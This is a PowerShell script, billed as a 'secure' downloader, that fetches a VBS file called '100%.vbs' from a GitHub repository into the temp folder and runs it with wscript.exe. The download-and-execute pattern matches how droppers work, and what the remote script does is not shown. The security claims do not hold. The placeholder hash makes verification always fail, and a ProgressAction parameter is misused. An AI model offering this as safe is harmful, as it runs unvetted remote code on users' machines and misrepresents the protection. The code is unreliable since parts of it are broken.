<#
.SYNOPSIS
    Secure VBScript Downloader and Executor

.DESCRIPTION
    Safely downloads and executes VBScript files with comprehensive security checks,
    logging, and user notifications. Includes hash verification and proper cleanup.

.NOTES
    Version: 2.0
    Author: Your Name
    Requirements: PowerShell 5.1+ (.NET Framework) or PowerShell 7+ (Cross-platform)
#>

#region Configuration
$Config = @{
    TempFolder      = "$env:TEMP\VBScriptRunner"
    VbsFileURL      = "https://github.com/seunoshino/myapp-downloads/raw/main/100%25.vbs"
    LocalFileName   = "ApplicationScript.vbs"  # More descriptive name
    ExpectedHash    = "INSERT_SHA256_HASH_HERE"  # Recommended for security
    LogFile         = "$env:TEMP\VBScriptRunner.log"
    ExecutionTimeout = 300  # 5 minutes timeout for script execution
}
#endregion

#region Initialization
function Write-Log {
    param(
        [string]$Message,
        [ValidateSet('Info','Warning','Error')]
        [string]$Level = 'Info'
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Level] $Message"
    
    try {
        $logEntry | Out-File -FilePath $Config.LogFile -Append -Encoding UTF8
    }
    catch {
        Write-Host "Failed to write to log file: $_" -ForegroundColor Red
    }
    
    $color = @{
        'Info'    = 'White'
        'Warning' = 'Yellow'
        'Error'   = 'Red'
    }[$Level]
    
    Write-Host $logEntry -ForegroundColor $color
}

function Show-Progress {
    param(
        [string]$Activity,
        [string]$Status,
        [int]$PercentComplete
    )
    
    if ($Host.UI.RawUI.WindowSize.Width -gt 0) {
        Write-Progress -Activity $Activity -Status $Status -PercentComplete $PercentComplete
    }
}

# Create temp directory if it doesn't exist
if (-not (Test-Path $Config.TempFolder)) {
    try {
        New-Item -ItemType Directory -Path $Config.TempFolder -Force | Out-Null
        Write-Log "Created temporary directory: $($Config.TempFolder)"
    }
    catch {
        Write-Log "Failed to create temporary directory: $_" -Level Error
        exit 1
    }
}
#endregion

#region Main Execution
try {
    $VbsFilePath = Join-Path $Config.TempFolder $Config.LocalFileName
    
    # Download the file with progress tracking
    Write-Log "Starting download from $($Config.VbsFileURL)"
    Show-Progress -Activity "Downloading Script" -Status "Connecting..." -PercentComplete 0
    
    try {
        $downloadParams = @{
            Uri             = $Config.VbsFileURL
            OutFile         = $VbsFilePath
            UseBasicParsing = $true
            ErrorAction    = 'Stop'
        }
        
        # Use faster download method if available (PowerShell 5.1+)
        if ($PSVersionTable.PSVersion.Major -ge 5) {
            $downloadParams.Add('ProgressAction', {
                param($progress)
                Show-Progress -Activity "Downloading Script" -Status "$($progress.PercentComplete)% Complete" -PercentComplete $progress.PercentComplete
            })
        }
        
        Invoke-WebRequest @downloadParams
        Write-Log "File downloaded successfully to $VbsFilePath"
    }
    catch {
        Write-Log "Download failed: $($_.Exception.Message)" -Level Error
        exit 1
    }
    finally {
        if ($Host.UI.RawUI.WindowSize.Width -gt 0) {
            Write-Progress -Activity "Downloading Script" -Completed
        }
    }

    # Verify file was downloaded
    if (-not (Test-Path $VbsFilePath)) {
        Write-Log "Downloaded file not found at expected location" -Level Error
        exit 1
    }

    # Hash verification (if provided)
    if (-not [string]::IsNullOrWhiteSpace($Config.ExpectedHash)) {
        Write-Log "Performing file hash verification..."
        try {
            $actualHash = (Get-FileHash -Path $VbsFilePath -Algorithm SHA256).Hash
            if ($actualHash -ne $Config.ExpectedHash) {
                Write-Log "Hash verification failed. Expected: $($Config.ExpectedHash), Actual: $actualHash" -Level Error
                Remove-Item $VbsFilePath -Force -ErrorAction SilentlyContinue
                exit 2
            }
            Write-Log "Hash verification successful"
        }
        catch {
            Write-Log "Hash verification error: $_" -Level Error
            exit 2
        }
    }

    # Execute the VBS script with timeout
    Write-Log "Starting execution of $VbsFilePath"
    try {
        $processParams = @{
            FilePath     = "wscript.exe"
            ArgumentList = "`"$VbsFilePath`""
            PassThru     = $true
            NoNewWindow  = $true
            ErrorAction = 'Stop'
        }

        $process = Start-Process @processParams
        $timedOut = $null
        $process | Wait-Process -Timeout $Config.ExecutionTimeout -ErrorAction SilentlyContinue -ErrorVariable timedOut

        if ($timedOut) {
            Write-Log "Script execution timed out after $($Config.ExecutionTimeout) seconds" -Level Warning
            $process | Stop-Process -Force -ErrorAction SilentlyContinue
            exit 3
        }

        Write-Log "Execution completed with exit code $($process.ExitCode)"
        exit $process.ExitCode
    }
    catch {
        Write-Log "Execution error: $_" -Level Error
        exit 4
    }
}
catch {
    Write-Log "Unexpected error: $_" -Level Error
    exit 99
}
finally {
    # Optional: Clean up downloaded file
    # Remove-Item $VbsFilePath -Force -ErrorAction SilentlyContinue
}
#endregion